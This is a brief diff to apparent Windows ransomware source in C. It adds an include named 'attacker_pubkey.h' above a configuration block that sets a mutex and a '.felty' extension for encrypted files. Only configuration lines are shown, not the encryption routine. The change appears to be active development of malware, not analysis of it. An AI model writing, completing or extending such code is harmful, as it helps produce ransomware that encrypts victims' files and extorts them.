@@ -19,6 +19,7 @@
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "netapi32.lib")
 
+#include "attacker_pubkey.h"
 /* ===================== CONFIGURATION ===================== */
 #define MUTEX_NAME       L"Global\\FeltyMutex_7F3A2B1C"
 #define ENC_EXT          L".felty"
